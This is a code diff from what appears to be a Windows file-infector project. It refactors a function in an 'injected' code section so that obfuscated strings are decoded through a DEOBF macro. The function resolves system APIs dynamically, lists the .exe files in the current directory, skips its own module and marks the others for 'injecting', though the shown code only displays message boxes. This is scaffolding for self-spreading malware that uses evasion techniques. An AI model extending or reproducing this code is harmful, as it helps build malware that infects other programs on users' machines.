@@ -36,28 +36,28 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     // CONST auto pLocalAlloc = GET_FUNC(pKernel32Dll, LocalAlloc);
     // CONST auto pLocalFree = GET_FUNC(pKernel32Dll, LocalFree);
 
-    CONST auto pUser32Dll = pLoadLibraryA(user32_deobf);
+    CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
 
     CHAR sModuleName[MAX_PATH];
     DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
     if (res == 0 || res >= sizeof(sModuleName)) {
-        pMessageBoxA(NULL, errGetModName_deobf, NULL, MB_OK | MB_ICONERROR);
+        pMessageBoxA(NULL, DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
         return;
     }
-    pMessageBoxA(NULL, sModuleName, mbTitle_deobf, MB_OK | MB_ICONINFORMATION);
+    pMessageBoxA(NULL, sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
     CHAR sDirName[MAX_PATH];
     CHAR sFindPath[MAX_PATH];
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
     if (res == 0 || res >= sizeof(sDirName)) {
-        pMessageBoxA(NULL, errGetDir_deobf, NULL, MB_OK | MB_ICONERROR);
+        pMessageBoxA(NULL, DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
         return;
     }
     my_strappend(sDirName, '\\');
     my_strcpy(sFindPath, sDirName);
-    my_strcat(sFindPath, exeExt_deobf);
-    pMessageBoxA(NULL, sFindPath, mbTitle_deobf, MB_OK | MB_ICONINFORMATION);
+    my_strcat(sFindPath, DEOBF(exeExt));
+    pMessageBoxA(NULL, sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
     CHAR sFilePath[MAX_PATH];
     LPSTR sDirEnd = my_strcpy(sFilePath, sDirName) - 1;
@@ -65,7 +65,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     WIN32_FIND_DATAA findData;
     HANDLE hFind = pFindFirstFileA(sFindPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
-        pMessageBoxA(NULL, errFindFile_deobf, NULL, MB_OK | MB_ICONERROR);
+        pMessageBoxA(NULL, DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
         return;
     }
 
@@ -76,13 +76,13 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
         my_strcpy(sDirEnd, findData.cFileName);
         if (!my_stricmp(sFilePath, sModuleName)) {
-            pMessageBoxA(NULL, sFilePath, mbInjecting_deobf, MB_OK | MB_ICONWARNING);
+            pMessageBoxA(NULL, sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
             continue;
         }
-        pMessageBoxA(NULL, sFilePath, mbInjecting_deobf, MB_OK | MB_ICONINFORMATION);
+        pMessageBoxA(NULL, sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONINFORMATION);
     } while (pFindNextFileA(hFind, &findData));
 
     pFindClose(hFind);
 
-    // pMessageBoxA(NULL, mbText_deobf, mbTitle_deobf, MB_OKCANCEL | MB_ICONINFORMATION);
+    // pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle), MB_OKCANCEL | MB_ICONINFORMATION);
 }
